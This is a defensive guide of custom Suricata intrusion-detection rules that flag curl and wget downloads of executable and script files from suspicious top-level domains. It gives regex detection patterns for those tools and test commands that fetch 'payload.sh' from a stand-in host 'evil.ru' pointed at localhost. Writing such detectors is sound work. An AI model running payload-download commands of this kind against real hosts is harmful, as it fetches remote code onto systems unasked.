# Suricata Rules: Detecting curl/wget Downloads from Suspicious TLDs

This guide provides custom Suricata rules to detect file downloads from suspicious TLDs using **curl** or **wget**. It includes explanations, test methods, and tuning advice.

---

## A) HTTP: curl / wget downloading “risky” file types from suspicious TLDs

**What it looks for**
- Matches HTTP `GET` requests
- User-Agent contains `curl/` or `Wget/`
- Host ends with suspicious TLD (e.g., `.ru`, `.cn`, `.su`, `.tk`, `.top`, `.xyz`, `.zip`, `.click`, `.pw`)
- URI ends with risky file extensions (e.g., `.exe`, `.dll`, `.ps1`, `.bat`, `.js`, `.sh`, `.py`, `.zip`, `.tar`, `.gz`, `.deb`, `.rpm`, `.apk`, `.msi`)
- ```flow:established,to_server``` The rule will only trigger on packets that are part of an already established network connection and are traveling from the client to the server. This combination ensures the rule is more specific, matching on the bidirectional flow of an active session and focusing only on the initial direction of data.

```suricata
# 100001 — curl + suspicious TLD + risky file extension (HTTP)
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"HTTP curl file download from suspicious TLD";
    flow:established,to_server;
    http.method; content:"GET";
    http.user_agent; content:"curl/"; nocase;
    http.host; pcre:"/\.(ru|cn|su|tk|top|xyz|zip|click|pw)$/Ri";
    http.uri;  pcre:"/\.(exe|dll|ps1|bat|js|sh|py|zip|tar(?:\.gz)?|tgz|xz|deb|rpm|apk|msi)(?:\?|$)/Ri";
    classtype:policy-violation;
    metadata: attack_target Client, created_at 2025_08_26, mitre_tactic Execution, mitre_technique_id T1204;
    sid:100001; rev:1;
)

# 100002 — Wget + suspicious TLD + risky file extension (HTTP)
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"HTTP Wget file download from suspicious TLD";
    flow:established,to_server;
    http.method; content:"GET";
    http.user_agent; content:"Wget/"; nocase;
    http.host; pcre:"/\.(ru|cn|su|tk|top|xyz|zip|click|pw)$/Ri";
    http.uri;  pcre:"/\.(exe|dll|ps1|bat|js|sh|py|zip|tar(?:\.gz)?|tgz|xz|deb|rpm|apk|msi)(?:\?|$)/Ri";
    classtype:policy-violation;
    metadata: attack_target Client, created_at 2025_08_26, mitre_tactic Execution, mitre_technique_id T1204;
    sid:100002; rev:1;
)
```
***Why this works***

- http.user_agent reliably carries curl/ or Wget/ unless the operator spoofs it.

- ```http.host``` + ```pcre``` anchors on ***TLD*** at ***end of host.***

- ```http.uri``` + ```pcre``` looks for ***file extensions*** at ***URI end*** (allows query strings via ```(?:\?|$))```.

- Keeping the checks in separate sticky buffers avoids false matches across fields. (see notes about new suricata 7 behavior with sticky buffers - https://github.com/tskinnerarlo/Bridging-Host-and-Network/blob/main/suricata_sticky_buffers.md)
---

## B) TLS/SNI: curl or wget to suspicious TLDs (best-effort)

Since HTTPS hides headers/URIs, detection falls back to SNI and optional JA3.

```suricata
# 100003 — TLS SNI to suspicious TLD (any client). Use as context signal.
alert tls $HOME_NET any -> $EXTERNAL_NET any (
    msg:"TLS SNI to suspicious TLD";
    flow:established,to_server;
    tls.sni; pcre:"/\.(ru|cn|su|tk|top|xyz|zip|click|pw)$/Ri";
    tls.version:1.0-1.3;
    classtype:policy-violation;
    metadata: created_at 2025_08_26, confidence Moderate, note "Cannot see file names over TLS";
    sid:100003; rev:1;
)
```

Optional JA3 matching can be added if you maintain known hashes.

---

## How to Test

### 1) Local HTTP test with fake domain

```bash
# Map suspicious domain to localhost
echo "127.0.0.1 evil.ru" | sudo tee -a /etc/hosts

# Start local HTTP server with a payload
mkdir -p ~/webroot && cd ~/webroot
touch payload.sh
python3 -m http.server 8000

# Test with curl (triggers rule 100001)
curl http://evil.ru:8000/payload.sh -o /tmp/payload.sh

# Test with wget (triggers rule 100002)
wget http://evil.ru:8000/payload.sh -O /tmp/payload.sh
```

Check Suricata logs:
```bash
jq 'select(.alert != null) | {timestamp,src_ip,dest_ip,alert}' /var/log/suricata/eve.json
```

### 2) TLS/SNI test
```bash
curl https://example.top/
```

This should trigger rule **100003**.

---

## Tuning Tips
- **TLD list**: Start narrow, expand with threat intel.
- **Extensions**: Keep only truly risky types to reduce FPs.
- **User-Agent spoofing**: Attackers may fake UAs; consider companion rules.
- **Correlate with DNS/Proxy/EDR**: Use alerts as pivots, not final verdicts.

---

## Maintenance
- Use local SID space (`1000000+`) if you already run community/pro rules.
- Document changes in `metadata`.
